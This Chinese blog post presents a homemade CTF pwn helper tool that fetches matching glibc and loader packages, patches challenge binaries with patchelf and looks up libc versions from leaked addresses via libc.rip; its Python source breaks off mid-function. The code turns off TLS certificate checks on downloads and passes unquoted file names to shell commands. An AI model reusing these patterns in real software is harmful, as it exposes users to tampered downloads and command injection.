---
title: HACKED的pwn脚本工具
description: 一些自己制作的脚本（虽然我觉得应该没什么东西比AI更加好用了）
date: 2026-06-15 10:47:06
updated: 2026-06-15 10:47:06
image: https://images.cnblogs.com/cnblogs_com/blogs/860797/galleries/2492655/o_260615032138_1ff0975d4ca266335a822aa36711bbbdfafeaf71_raw.jpg
categories: [pwn]
tags: [pwn, python脚本, 懒人工具]
---

## HACKED的pwn脚本工具

::alert{icon="tabler:files" color="var(--c-accent)" title="HACKED的脚本gitee仓库"}

[脚本下载，点击跳转](https://gitee.com/ASUS_HACKED/cybersecurity/tree/%E6%AF%94%E8%B5%9B%E9%99%84%E4%BB%B6/HACKED%E7%9A%84%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/%E5%88%B6%E4%BD%9C%E7%9A%84%E5%B7%A5%E5%85%B7/pwn)
::

## 前言

当前时代AI变得很厉害了，那我们还有必要写自己的脚本工具吗？其实我觉得脚本的速度可能会比AI快一点点（如果你接入了MCP那我没说），我觉得开发一个适合自己的工具会更加方便自己做题，同时不需要重复做大量的工作，这样如果是线下断网比赛那就是一个很好的武器库了。这是基于AI开发的脚本，如果在使用过程中出现了bug或者想提出什么改进功能的话欢迎各位师傅反馈（拜托啦）

#icon
ヾ(•ω•`)o
#default
希望我的脚本能帮助到各位师傅
::

## pwn-libc快速识别和下载绑定脚本-PWN_LIBC_TOOL v2.0

CTF PWN 本地环境一键配置工具 — 自动下载 libc/链接器、patchelf 绑定、libc.rip 在线查询

![image-20260615105732918](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615111246885-928938075.png)

### 安装

```bash
# 直接运行，无需安装
python3 libc_tool.py

# 依赖 (通常已自带)
pip install pwntools
sudo apt install patchelf
```

### 功能一览

| 编号 | 功能                | 说明                                                   |
| ---- | ------------------- | ------------------------------------------------------ |
| 1    | 下载 libc + 链接器  | 输入版本号，从镜像源下载 deb 包，提取 libc 和 ld-linux |
| 2    | patchelf 绑定二进制 | 自动扫描目录中的 libc/ld/二进制，一键 patchelf         |
| 3    | 一键完成            | 下载 + 绑定一步到位                                    |
| 4    | 检测 libc 版本      | 自动识别当前目录 libc 的版本和发行版                   |
| 5    | 查看链接器          | 用 readelf 查看二进制使用的 interpreter                |
| 6    | 查看 libc 详细版本  | 用 strings 查看 libc 的完整版本信息                    |
| 7    | 根据已有文件下载    | 有 libc 下载 ld，有 ld 下载 libc                       |
| 8    | libc.rip 在线查询   | 粘贴泄露地址，自动查 libc 版本并下载                   |
| 9    | pwninit 一键配置    | 调用 pwninit 自动下载 ld + patchelf                    |

### 使用流程

#### 场景 1：题目给了 libc.so.6

```bash
# 1. 放到题目目录
cp libc.so.6 /path/to/challenge/

# 2. 运行工具
cd /path/to/challenge/
python3 libc_tool.py

# 3. 选功能 9 (pwninit) 或 功能 2 (手动 patchelf)
# 自动生成 format_station_patched，直接跑 exploit
```

#### 场景 2：只有泄露地址，不知道 libc 版本

```bash
python3 libc_tool.py

# 1. 选功能 8，粘贴泄露地址
#    [*] puts: 0x7f1234567890
#    [*] printf: 0x7f1234560000
#
# 2. 工具自动查询 libc.rip，找到版本并下载
# 3. 选功能 9 或 2 绑定二进制
```

#### 场景 3：已知 libc 版本号

```bash
python3 libc_tool.py

# 1. 选功能 1，输入版本号
#    如: 2.35-0ubuntu3.13_amd64
#
# 2. 自动下载 libc + ld-linux
# 3. 选功能 2 绑定二进制
```

### 功能详解

#### 功能 1：下载 libc + 链接器

输入 libc 版本号（如 `2.35-0ubuntu3.13_amd64`），工具会：

1. 从 15+ 个镜像源尝试下载 deb 包
2. 自动检测发行版（Debian/Ubuntu），只搜对应镜像
3. 精确版本找不到时，自动搜索同系列最新版
4. 提取 libc.so.6 和 ld-linux-x86-64.so.2

支持的镜像源：
- 清华、阿里云、中科大镜像
- Debian/Ubuntu 官方源
- 安全更新源
- 旧版归档源

#### 功能 2：patchelf 绑定二进制

自动扫描目录中的文件：
- **libc 文件**：`.so` / `.so.6` 等，自动识别版本和发行版
- **ld 文件**：`ld-*.so` / `ld-linux-*.so.2`，自动识别版本
- **二进制文件**：排除 `.so` / `.py` / IDA 数据库等

选择 libc 后，自动匹配同版本的 ld 文件：
- 版本完全匹配 → 直接使用
- 版本不匹配 → 显示警告，让用户选择
- 没有 ld → 自动下载

#### 功能 7：根据已有文件下载

- 有 libc → 下载匹配的 ld-linux
- 有 ld → 下载匹配的 libc
- 自动识别文件版本，从 deb 包中提取

#### 功能 8：libc.rip 在线查询

支持多种输入格式：
```
# pwntools 输出 (直接复制)
[*] puts: 0x7fbb47a80e50
[*] printf: 0x7fbb47a606f0

# 其他格式
puts: 0x7f1234567890
puts 0x7f1234567890
0x7f1234567890
```

查询结果包含：
- libc 版本号
- 下载链接 (libc.so)
- 符号偏移表

#### 功能 9：pwninit 一键配置

调用 [pwninit](https://github.com/io12/pwninit) 自动完成：
1. 检测 libc 版本
2. 下载匹配的 ld-linux
3. patchelf 生成 `xxx_patched` 文件

如果 pwninit 未安装，工具会自动从 GitHub 下载 Rust 版本。

---



### 版本检测

工具使用 `strings` 命令检测文件版本，支持：

- **Debian GLIBC**：`GNU C Library (Debian GLIBC 2.36-9+deb12u13)`
- **Ubuntu GLIBC**：`GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.13)`
- **ld-linux**：`ld.so (Debian GLIBC 2.36-9+deb12u14) stable release version 2.36`

自动识别发行版后，只搜索对应发行版的镜像源。

---



### 下载策略

当精确版本找不到时：

1. **搜索同系列最新版**：从镜像目录中找同基础版本的最新 deb
   - 如请求 `u13`，找到 `u14` → 下载 `u14`
2. **libc.rip 兜底**：通过 libc.rip API 获取精确下载链接
3. **Docker 提示**：给出 Docker 命令提取链接器

---

### 注意事项

- **路径特殊字符**：题目目录含 `[]` 等特殊字符时，下载的文件可能保存到 `/tmp`
- **WSL/NTFS**：IDA 数据库文件可能有权限问题，工具会自动处理
- **降级兼容**：同系列不同补丁号的 ld 可以混用（如 u14 ld + u13 libc）
- **pwninit 网络问题**：某些网络环境下 pwninit 无法下载 ld，工具会自动补下载

---

### 文件说明

```
format_station1/
├── libc_tool.py          # 主工具
├── libc.so.6              # 题目 libc (示例)
├── ld-2.36.so             # 链接器 (示例)
├── format_station         # 题目二进制 (示例)
├── format_station_patched # patchelf 后的二进制
└── README.md              # 本文件
```

---

### 常见问题

**Q: 为什么下载失败？**
A: 精确版本可能已从镜像移除，工具会自动搜索同系列最新版。

**Q: ld 和 libc 版本不完全匹配能用吗？**
A: 同系列（如都是 2.36）不同补丁号（u7/u13/u14）通常可以混用。

**Q: pwninit 报错怎么办？**
A: 工具会自动处理 pwninit 的问题（下载 ld、修复 interpreter）。也可以用功能 2 手动 patchelf。

**Q: 路径有特殊字符怎么办？**
A: 下载的文件可能保存到 `/tmp`，工具会提示路径。



---

### 脚本源码

```python
#!/usr/bin/env python3
"""
CTF libc 本地复现工具 - 一键下载 libc + 链接器 + patchelf 绑定
支持多个下载源，自动重试
"""

import os
import sys
import subprocess
import shutil
import urllib.request
import ssl
import time
import json

# 修复方向键乱码
try:
    import gnureadline as readline
except ImportError:
    try:
        import readline
    except ImportError:
        pass

# ============================================================
#  下载源配置
# ============================================================
MIRRORS = [
    # ==================== Debian 安全更新 ====================
    {
        "name": "Debian 安全更新 (官方)",
        "url": "https://deb.debian.org/debian-security/pool/updates/main/g/glibc/libc6/libc6_{version}.deb",
    },
    {
        "name": "清华镜像 (Debian 安全)",
        "url": "https://mirrors.tuna.tsinghua.edu.cn/debian-security/pool/updates/main/g/glibc/libc6/libc6_{version}.deb",
    },
    {
        "name": "中科大镜像 (Debian 安全)",
        "url": "https://mirrors.ustc.edu.cn/debian-security/pool/updates/main/g/glibc/libc6/libc6_{version}.deb",
    },
    # ==================== Debian 主仓库 ====================
    {
        "name": "Debian 官方",
        "url": "https://deb.debian.org/debian/pool/main/g/glibc/libc6_{version}.deb",
    },
    {
        "name": "清华镜像 (Debian)",
        "url": "https://mirrors.tuna.tsinghua.edu.cn/debian/pool/main/g/glibc/libc6_{version}.deb",
    },
    {
        "name": "阿里云镜像 (Debian)",
        "url": "https://mirrors.aliyun.com/debian/pool/main/g/glibc/libc6_{version}.deb",
    },
    {
        "name": "中科大镜像 (Debian)",
        "url": "https://mirrors.ustc.edu.cn/debian/pool/main/g/glibc/libc6_{version}.deb",
    },
    {
        "name": "Debian 旧版 (archive)",
        "url": "https://archive.debian.org/debian/pool/main/g/glibc/libc6_{version}.deb",
    },
    # ==================== Ubuntu 安全更新 ====================
    {
        "name": "Ubuntu 安全更新 (官方)",
        "url": "http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6/libc6_{version}.deb",
    },
    {
        "name": "清华镜像 (Ubuntu 安全)",
        "url": "https://mirrors.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6/libc6_{version}.deb",
    },
    # ==================== Ubuntu 主仓库 ====================
    {
        "name": "Ubuntu 官方",
        "url": "http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_{version}.deb",
    },
    {
        "name": "清华镜像 (Ubuntu)",
        "url": "https://mirrors.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6_{version}.deb",
    },
    {
        "name": "阿里云镜像 (Ubuntu)",
        "url": "https://mirrors.aliyun.com/ubuntu/pool/main/g/glibc/libc6_{version}.deb",
    },
    {
        "name": "中科大镜像 (Ubuntu)",
        "url": "https://mirrors.ustc.edu.cn/ubuntu/pool/main/g/glibc/libc6_{version}.deb",
    },
    {
        "name": "Ubuntu 旧版仓库",
        "url": "http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_{version}.deb",
    },
    # ==================== Ubuntu 安全更新 (各版本) ====================
    {
        "name": "Ubuntu 24.04 安全更新",
        "url": "http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_{version}.deb",
    },
    # ==================== Kali (基于 Debian Testing) ====================
    {
        "name": "清华镜像 (Kali)",
        "url": "https://mirrors.tuna.tsinghua.edu.cn/kali/pool/main/g/glibc/libc6_{version}.deb",
    },
    {
        "name": "中科大镜像 (Kali)",
        "url": "https://mirrors.ustc.edu.cn/kali/pool/main/g/glibc/libc6_{version}.deb",
    },
    # ==================== 其他常见发行版 ====================
    {
        "name": "清华镜像 (CentOS/RHEL)",
        "url": "https://mirrors.tuna.tsinghua.edu.cn/centos/{version_major}/BaseOS/x86_64/os/Packages/glibc-{version}.rpm",
    },
]

BANNER = r"""
 ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗
 ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
 ███████║███████║██║     █████╔╝ █████╗  ██║  ██║
 ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║
 ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝
 ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝
              PWN_LIBC_TOOL v2.0
"""

# ============================================================
#  工具函数
# ============================================================

def log(msg, level="info"):
    prefix = {"info": "[*]", "ok": "[+]", "err": "[-]", "warn": "[!]"}
    print(f"{prefix.get(level, '[*]')} {msg}")

def run_cmd(cmd):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return r.returncode == 0, r.stdout, r.stderr

def find_elf_files():
    """检测当前目录下的 ELF 可执行文件（排除 .so 和 ld-*）"""
    candidates = []
    for f in os.listdir('.'):
        if not os.path.isfile(f):
            continue
        if f.endswith(('.py', '.sh', '.c', '.h', '.txt', '.md', '.so', '.deb', '.bak',
                        '.id0', '.id1', '.id2', '.nam', '.til', '.bak')):
            continue
        if f.startswith('ld-') or f.startswith('ld.so') or 'ld-linux' in f:
            continue
        try:
            with open(f, 'rb') as fh:
                magic = fh.read(4)
                if magic == b'\x7fELF':
                    candidates.append(f)
        except:
            pass
    return candidates

def identify_elf_type(filepath):
    """识别 ELF 文件类型: 'libc', 'ld', 或 'unknown'
    通过 readelf 和 strings 判断，不依赖文件名
    """
    # 方法1: strings 查找特征
    ok, out, _ = run_cmd(f'strings {filepath} 2>/dev/null | head -5')
    if ok:
        if 'GNU C Library' in out or 'glibc' in out.lower():
            return 'libc'
        if out.strip().startswith('ld.so') or 'ld-linux' in out:
            return 'ld'

    # 方法2: readelf 查看是否有 interpreter
    ok, out, _ = run_cmd(f'readelf -l {filepath} 2>/dev/null | grep interpreter')
    if ok:
        if out.strip():
            # 有 interpreter → 是普通共享库 (libc)
            return 'libc'
        else:
            # 无 interpreter → 可能是链接器
            ok2, out2, _ = run_cmd(f'readelf -d {filepath} 2>/dev/null | grep NEEDED')
            if ok2 and not out2.strip():
                return 'ld'

    # 方法3: 文件名兜底
    name = os.path.basename(filepath).lower()
    if 'libc' in name:
        return 'libc'
    if 'ld' in name and ('ld-linux' in name or name.startswith('ld-') or name == 'ld.so'):
        return 'ld'

    return 'unknown'

def scan_glibc_files():
    """扫描当前目录所有 glibc 相关文件 (libc + ld-linux)
    返回: [(文件路径, 文件类型, 版本号|None, 发行版|None)]
    """
    results = []

    # 扫描当前目录文件
    for f in sorted(os.listdir('.')):
        if not os.path.isfile(f):
            continue
        # libc 文件
        if 'libc' in f.lower() and (f.endswith('.so') or '.so.' in f):
            ver, distro = identify_version_from_file(f)
            results.append((f, 'libc', ver, distro))
        # ld 文件
        if ('ld-linux' in f or f.startswith('ld-') or f == 'ld.so') and \
           (f.endswith('.so') or '.so.' in f):
            ver, distro = identify_version_from_file(f)
            results.append((f, 'ld', ver, distro))

    # 扫描 libc6_* 目录
    for d in sorted(os.listdir('.')):
        if d.startswith('libc6_') and os.path.isdir(d):
            ld = os.path.join(d, "lib/x86_64-linux-gnu/ld-linux-x86-64.so.2")
            lc = os.path.join(d, "lib/x86_64-linux-gnu/libc.so.6")
            if os.path.exists(lc):
                results.append((lc, 'libc', None, None))
            if os.path.exists(ld):
                results.append((ld, 'ld', None, None))

    return results

def detect_libc_version():
    """尝试从当前目录的 libc 文件检测版本"""
    for f in os.listdir('.'):
        if not os.path.isfile(f):
            continue
        if 'libc' in f.lower() and (f.endswith('.so') or '.so.' in f):
            ver, distro = identify_version_from_file(f)
            if ver:
                return ver, distro
    # 也扫描 libc6_* 目录
    for d in os.listdir('.'):
        if d.startswith('libc6_') and os.path.isdir(d):
            lc = os.path.join(d, "lib/x86_64-linux-gnu/libc.so.6")
            if os.path.exists(lc):
                ver, distro = identify_version_from_file(lc)
                if ver:
                    return ver, distro
    return None, None

def identify_version_from_file(filepath):
    """从 libc 或 ld-linux 文件中识别完整版本号 (兼容 Ubuntu/Debian)
    返回: (完整版本号如 '2.36-9+deb12u13_amd64', 发行版如 'debian'/'ubuntu'/None)
    """
    import re
    try:
        # 优先用 strings 命令，避免二进制中短版本串干扰
        ok, out, _ = run_cmd(f'strings {filepath} 2>/dev/null | grep "stable release" | head -1')
        if ok and out.strip():
            line = out.strip()
            # "GNU C Library (Debian GLIBC 2.36-9+deb12u13) stable release version 2.36."
            # 提取完整版本号 2.36-9+deb12u13
            match = re.search(r'(\d+\.\d+[-+][\w.+]+)', line)
            if match:
                ver = match.group(1)
                distro = None
                if 'Debian' in line:
                    distro = 'debian'
                elif 'Ubuntu' in line:
                    distro = 'ubuntu'
                return ver + "_amd64", distro

        # 备用: 直接读二进制
        with open(filepath, 'rb') as f:
            data = f.read()

        for pattern, distro_hint in [
            (rb'Debian GLIBC (\d+\.\d+[-+][\w.+]+)\)', 'debian'),
            (rb'Ubuntu GLIBC (\d+\.\d+[-+][\w.+]+)\)', 'ubuntu'),
            (rb'stable release version (\d+\.\d+[-+][\w.+]+)', None),
        ]:
            match = re.search(pattern, data)
            if match:
                return match.group(1).decode() + "_amd64", distro_hint

    except Exception as e:
        log(f"读取文件失败: {e}", "err")

    return None, None

def _display_width(s):
    """计算字符串的终端显示宽度（中文占2列）"""
    import unicodedata
    w = 0
    for c in s:
        eaw = unicodedata.east_asian_width(c)
        if eaw in ('W', 'F'):
            w += 2
        else:
            w += 1
    return w

def _box_line(content, width=40):
    """生成 box 的一行，自动对齐中文宽度"""
    pad = width - 2 - _display_width(content)
    if pad < 0:
        pad = 0
    return f"│  {content}{' ' * pad}│"

def query_libc_rip():
    """通过 libc.rip 在线查询 libc 版本"""
    import re
    import webbrowser

    print()
    print("  ┌──────────────────────────────────────┐")
    print("  │  libc.rip 在线查询                   │")
    print("  │  1. 粘贴泄露地址自动查询             │")
    print("  │  2. 打开 libc.rip 网页               │")
    print("  │  3. 返回主菜单                       │")
    print("  └──────────────────────────────────────┘")

    sub = input("[+] 选择: ").strip()

    if sub == '1':
        # 粘贴格式查询，支持一次性粘贴多个
        log("粘贴泄露的地址 (支持以下格式，直接粘贴多行):")
        print()
        print("  pwntools 输出 (直接复制):")
        print("    [*] puts: 0x7fbb47a80e50")
        print("    [*] printf: 0x7fbb47a606f0")
        print("    [*] read: 0x7fbb47b14850")
        print()
        print("  其他格式也支持:")
        print("    puts: 0x7f1234567890")
        print("    puts 0x7f1234567890")
        print("    0x7f1234567890")
        print()
        log("粘贴后按两次回车查询:")
        print()

        symbols = {}
        while True:
            try:
                line = input("    > ").strip()
            except EOFError:
                break
            if not line:
                break

            # 去掉 [*] 前缀
            clean = re.sub(r'^\[\*\]\s*', '', line).strip()

            # 格式: [*] puts: 0x7fbb47a80e50  或  puts: 0x7f...  或  puts = 0x7f...
            match = re.match(r'(\w+)\s*[:=]\s*(0x[0-9a-fA-F]+)', clean)
            if match:
                symbols[match.group(1)] = match.group(2)
                continue

            # 格式: puts 0x7f1234567890  或  puts addr -> 0x7f...
            match = re.match(r'(\w+)[\s\->]*(0x[0-9a-fA-F]+)', clean)
            if match:
                symbols[match.group(1)] = match.group(2)
                continue

            # 格式: 只有地址
            if clean.startswith('0x'):
                func = input(f"    函数名: ").strip()
                if func:
                    symbols[func] = clean
                continue

            log(f"无法解析: {line}", "warn")

        if not symbols:
            log("未输入任何地址", "err")
            return

        # 显示解析结果
        print()
        log(f"解析到 {len(symbols)} 个函数:")
        for name, addr in symbols.items():
            print(f"    {name}: {addr}")

        # 查询 libc.rip
        print()
        log("正在查询 libc.rip ...")
        try:
            url = "https://libc.rip/api/find"
            data = json.dumps({"symbols": symbols}).encode()
            req = urllib.request.Request(url, data=data,
                                        headers={'Content-Type': 'application/json',
                                                 'User-Agent': 'Mozilla/5.0'})
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
                results = json.loads(resp.read().decode())

            if not results:
                log("未找到匹配的 libc", "warn")
                print("  提示: 尝试用更多函数地址查询以缩小范围")
                return

            log(f"找到 {len(results)} 个匹配:")
            print()
            for i, r in enumerate(results):
                name = r.get('id', r.get('name', 'unknown'))
                download_url = r.get('download_url', '')
                print(f"  [{i+1}] {name}")
                if download_url:
                    print(f"      下载链接: {download_url}")

            # 询问是否自动下载
            if len(results) == 1:
                dl = results[0].get('download_url', '')
                if dl:
                    print()
                    confirm = input("[+] 是否自动下载该 libc? (y/n): ").strip().lower()
                    if confirm == 'y':
                        fname = results[0].get('id', 'libc') + '.so'
                        log(f"下载中: {dl}")
                        if download_file(dl, fname):
                            log(f"下载完成: {fname}", "ok")
                        else:
                            log(f"手动下载: {dl}")
            else:
                print()
                idx = input("[+] 输入编号下载 (回车跳过): ").strip()
                if idx:
                    try:
                        r = results[int(idx) - 1]
                        dl = r.get('download_url', '')
                        if dl:
                            fname = r.get('id', 'libc') + '.so'
                            log(f"下载中: {dl}")
                            if download_file(dl, fname):
                                log(f"下载完成: {fname}", "ok")
                        else:
                            log("该结果无下载链接", "warn")
                    except Exception as e:
                        log(f"下载失败: {e}", "err")

        except Exception as e:
            log(f"查询失败: {e}", "err")
            log("可以手动访问 https://libc.rip 查询")

    elif sub == '2':
        log("正在打开 libc.rip ...")
        try:
            webbrowser.open("https://libc.rip")
        except:
            log("无法自动打开浏览器，请手动访问: https://libc.rip")

def fetch_matching_component():
    """根据已有文件下载对应的链接器或 libc"""
    import re

    # 扫描当前目录的 libc 和 ld-linux 文件
    libc_files = []
    ld_files = []

    for f in os.listdir('.'):
        if not os.path.isfile(f):
            continue
        if 'libc' in f.lower() and (f.endswith('.so') or '.so.' in f):
            libc_files.append(f)
        if 'ld' in f.lower() and (f.endswith('.so') or '.so.' in f or 'ld-linux' in f):
            ld_files.append(f)

    # 也扫描 libc6_* 目录
    for d in os.listdir('.'):
        if d.startswith('libc6_') and os.path.isdir(d):
            lp = os.path.join(d, "lib/x86_64-linux-gnu/libc.so.6")
            dp = os.path.join(d, "lib/x86_64-linux-gnu/ld-linux-x86-64.so.2")
            if os.path.exists(lp):
                libc_files.append(lp)
            if os.path.exists(dp):
                ld_files.append(dp)

    if not libc_files and not ld_files:
        log("未找到 libc 或 ld-linux 文件", "warn")
        print("  提示: 将 libc.so.6 或 ld-linux-x86-64.so.2 放到当前目录")
        return

    # 展示找到的文件
    log("检测到以下文件:")
    all_files = []
    for f in libc_files:
        all_files.append(('libc', f))
    for f in ld_files:
        all_files.append(('ld', f))
    for i, (ftype, fpath) in enumerate(all_files):
        print(f"  [{i+1}] [{ftype}] {fpath}")

    if len(all_files) == 1:
        ftype, fpath = all_files[0]
    else:
        idx = input("[+] 选择文件编号 (1, 2, ...): ").strip()
        try:
            ftype, fpath = all_files[int(idx) - 1]
        except:
            log("无效选择", "err")
            return

    # 识别版本号
    log(f"正在识别 {fpath} 的版本...")
    version, file_distro = identify_version_from_file(fpath)

    if not version:
        log("无法自动识别版本号", "err")
        version = input("[+] 手动输入版本号 (如 2.35-0ubuntu3.13_amd64): ").strip()
        if not version:
            return

    # 清理版本号
    if version.startswith("libc6_"):
        version = version[6:]
    if version.endswith(".deb"):
        version = version[:-4]

    log(f"识别到版本: {version}")

    # 如果版本号太短(如只有 2.35)，尝试从目录名推断完整版本
    if '-' not in version or '_amd64' not in version:
        log("版本号不完整，尝试从目录名推断...", "warn")
        # 匹配主版本号 (如 2.35)
        major_minor = '.'.join(version.split('.')[:2])
        candidates = []
        for d in os.listdir('.'):
            if d.startswith('libc6_') and major_minor in d and os.path.isdir(d):
                candidates.append(d.replace("libc6_", ""))

        if candidates:
            if len(candidates) == 1:
                full_ver = candidates[0]
                confirm = input(f"[+] 推断完整版本为: {full_ver}，是否使用? (y/n): ").strip().lower()
                if confirm == 'y':
                    version = full_ver
                    log(f"使用版本: {version}")
            else:
                log(f"找到多个匹配版本:")
                for i, v in enumerate(candidates):
                    print(f"  [{i+1}] {v}")
                idx = input("[+] 选择编号: ").strip()
                try:
                    version = candidates[int(idx) - 1]
                    log(f"使用版本: {version}")
                except:
                    pass
        else:
            log(f"目录中未找到匹配 {major_minor}.x 的版本")

        # 仍然没有完整版本号，提示手动输入
        if '-' not in version or '_amd64' not in version:
            manual = input(f"[+] 手动输入完整版本号 (如 2.35-0ubuntu3.13_amd64): ").strip()
            if manual:
                if manual.startswith("libc6_"):
                    manual = manual[6:]
                if manual.endswith(".deb"):
                    manual = manual[:-4]
                version = manual
                log(f"使用版本: {version}")

    # 判断缺什么
    has_libc = len(libc_files) > 0
    has_ld = len(ld_files) > 0
    extract_dir = f"libc6_{version}"

    if ftype == 'libc':
        # 有 libc，需要下载 ld-linux
        log("已有 libc，需要下载匹配的 ld-linux 链接器")
        confirm = input(f"[+] 下载 libc6_{version}.deb 提取 ld-linux ? (y/n): ").strip().lower()
        if confirm != 'y':
            return

        if not os.path.exists(extract_dir):
            deb_file = download_deb(version, file_distro)
            if not deb_file:
                return
            # 从下载的文件名提取实际版本号 (可能是同系列最新版)
            actual_ver = os.path.basename(deb_file).replace('libc6_', '').replace('.deb', '')
            extract_dir = f"libc6_{actual_ver}"
            if not extract_deb(deb_file, extract_dir):
                return
            os.remove(deb_file)

        ld_path = f"{extract_dir}/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2"
        if os.path.exists(ld_path):
            log(f"链接器已就绪: {ld_path}", "ok")
        else:
            log("提取失败，未找到 ld-linux", "err")

    elif ftype == 'ld':
        # 有 ld-linux，需要下载 libc
        log("已有 ld-linux，需要下载匹配的 libc")
        confirm = input(f"[+] 下载 libc6_{version}.deb 提取 libc ? (y/n): ").strip().lower()
        if confirm != 'y':
            return

        if not os.path.exists(extract_dir):
            deb_file = download_deb(version, file_distro)
            if not deb_file:
                return
            actual_ver = os.path.basename(deb_file).replace('libc6_', '').replace('.deb', '')
            extract_dir = f"libc6_{actual_ver}"
            if not extract_deb(deb_file, extract_dir):
                return
            os.remove(deb_file)

        libc_path = f"{extract_dir}/lib/x86_64-linux-gnu/libc.so.6"
        libc_local = f"libc6_{version}.so"
        if os.path.exists(libc_path):
            shutil.copy2(libc_path, libc_local)
            log(f"libc 已就绪: {libc_local}", "ok")
        else:
            log("提取失败，未找到 libc", "err")

def detect_interpreter():
    """用 readelf 查看二进制文件使用的链接器"""
    binaries = find_elf_files()
    if not binaries:
        log("未检测到 ELF 可执行文件", "warn")
        return

    log("检测到的二进制文件及其链接器:")
    print()
    for b in binaries:
        ok, out, _ = run_cmd(f"readelf -l {b} 2>/dev/null | grep interpreter")
        if ok and out.strip():
            interp = out.strip().split(']')[0].split(':')[-1].strip() if ']' in out.strip() else out.strip().split(':')[-1].strip()
            # 判断是否已 patchelf
            status = ""
            if 'libc6_' in interp:
                status = " [已 patchelf]"
            else:
                status = " [系统默认]"
            print(f"  {b}")
            print(f"    链接器: {interp}{status}")
        else:
            print(f"  {b}")
            print(f"    链接器: 无法读取 (可能不是 ELF)")
        print()

def detect_libc_strings():
    """用 strings 查看 libc 版本信息"""
    libc_files = []
    for f in os.listdir('.'):
        if 'libc' in f.lower() and (f.endswith('.so') or '.so.' in f):
            libc_files.append(f)

    # 也扫描 libc6_* 目录
    for d in os.listdir('.'):
        if d.startswith('libc6_') and os.path.isdir(d):
            libc_path = os.path.join(d, "lib/x86_64-linux-gnu/libc.so.6")
            if os.path.exists(libc_path):
                libc_files.append(libc_path)

    if not libc_files:
        log("未找到 libc 文件", "warn")
        return

    log("libc 版本信息:")
    print()
    for f in libc_files:
        print(f"  文件: {f}")
        # 方法1: strings | grep "stable release"
        ok, out, _ = run_cmd(f'strings {f} 2>/dev/null | grep "stable release" | head -3')
        if ok and out.strip():
            for line in out.strip().split('\n'):
                print(f"    stable release: {line.strip()}")

        # 方法2: strings | grep glibc
        ok, out, _ = run_cmd(f'strings {f} 2>/dev/null | grep "GNU C Library" | head -3')
        if ok and out.strip():
            for line in out.strip().split('\n'):
                print(f"    {line.strip()}")

        # 方法3: strings | grep 版本号
        ok, out, _ = run_cmd(f'strings {f} 2>/dev/null | grep -E "^[0-9]+\.[0-9]+" | head -3')
        if ok and out.strip():
            for line in out.strip().split('\n'):
                line = line.strip()
                if any(c.isdigit() for c in line):
                    print(f"    版本号: {line}")

        print()

def download_file(url, output, timeout=10):
    """下载文件，返回是否成功"""
    import tempfile
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # 先下载到 /tmp 避免路径特殊字符问题
    tmp_output = os.path.join(tempfile.gettempdir(), os.path.basename(output))

    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            total = int(resp.headers.get('Content-Length', 0))
            downloaded = 0
            block_size = 8192

            with open(tmp_output, 'wb') as f:
                while True:
                    chunk = resp.read(block_size)
                    if not chunk:
                        break
                    f.write(chunk)
                    downloaded += len(chunk)
                    if total > 0:
                        pct = downloaded * 100 // total
                        bar = '█' * (pct // 2) + '░' * (50 - pct // 2)
                        print(f"\r    [{bar}] {pct}% ({downloaded // 1024}KB/{total // 1024}KB)", end='', flush=True)
            print()

        # 尝试复制到当前目录
        abs_output = os.path.abspath(output)
        try:
            shutil.copy2(tmp_output, abs_output)
            os.remove(tmp_output)
        except Exception:
            # 当前目录有特殊字符，保留在 /tmp
            print(f"    当前目录路径含特殊字符，文件保存在: {tmp_output}")
            print(f"    请手动复制: cp {tmp_output} .")
        return True
    except Exception as e:
        print(f"    失败: {e}")
        if os.path.exists(tmp_output):
            os.remove(tmp_output)
        return False

# ============================================================
#  核心功能
# ============================================================

def download_deb(version, distro=None):
    """从多个镜像下载 deb 包，distro 可指定发行版过滤镜像"""
    import re as _re
    deb_file = f"libc6_{version}.deb"

    log(f"版本: {version}")

    # 1. 先尝试精确版本的镜像下载
    if distro:
        distro_lower = distro.lower()
        filtered = [m for m in MIRRORS if distro_lower in m["name"].lower()]
        mirrors = filtered if filtered else MIRRORS
    else:
        mirrors = MIRRORS

    log(f"尝试 {len(mirrors)} 个镜像源...")
    for i, mirror in enumerate(mirrors):
        try:
            url = mirror["url"].format(version=version)
        except KeyError:
            continue
        print(f"  [{i+1}/{len(mirrors)}] {mirror['name']}")
        if download_file(url, deb_file):
            log(f"下载成功: {deb_file}", "ok")
            return deb_file

    # 2. 精确版本失败，从镜像目录找同系列最新版
    log("精确版本未找到，搜索同系列最新版本...", "warn")
    base_ver = _re.match(r'(\d+\.\d+-\d+)', version)
    if base_ver:
        base = base_ver.group(1)
        for mirror in mirrors:
            try:
                # 构造目录 URL (去掉文件名部分)
                dir_url = mirror["url"].format(version="PLACEHOLDER")
                dir_url = dir_url[:dir_url.rfind('/') + 1]
                req = urllib.request.Request(dir_url, headers={'User-Agent': 'Mozilla/5.0'})
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                    html = resp.read().decode(errors='ignore')
                # 找同系列的 deb 文件
